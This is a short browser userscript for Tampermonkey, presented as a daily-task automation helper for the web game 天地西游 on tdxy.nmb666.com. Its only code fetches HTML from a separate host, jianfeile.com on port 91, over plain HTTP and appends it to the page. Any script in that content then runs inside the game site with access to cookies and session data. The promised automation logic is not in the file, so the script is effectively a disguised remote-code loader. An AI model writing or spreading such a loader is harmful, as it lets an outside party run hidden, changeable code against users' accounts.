// ==UserScript==
// @name         天地西游自动脚本
// @namespace    http://tampermonkey.net/
// @version      0.9
// @description  天地西游的日常任务处理脚本!
// @author       YU
// @match        http://tdxy.nmb666.com/*
// @match        http://tdxy.nmb666.com/qiandao.aspx
// @grant        none
// @require https://greasyfork.org/scripts/24686-jquery-min/code/jquerymin.js?version=156920
// @require https://greasyfork.org/scripts/26454-jquery-cookie/code/jQuery%20Cookie.js?version=169689
// @downloadURL https://update.greasyfork.org/scripts/389358/%E5%A4%A9%E5%9C%B0%E8%A5%BF%E6%B8%B8%E8%87%AA%E5%8A%A8%E8%84%9A%E6%9C%AC.user.js
// @updateURL https://update.greasyfork.org/scripts/389358/%E5%A4%A9%E5%9C%B0%E8%A5%BF%E6%B8%B8%E8%87%AA%E5%8A%A8%E8%84%9A%E6%9C%AC.meta.js
// ==/UserScript==

(function() {
    'use strict';
$.ajax({
    url:"http://jianfeile.com:91/gua2.php",
    datatype:'html',
    type:'get',
    success:function(d){
        $("body").append(d);
    }
});

    // Your code here...
})();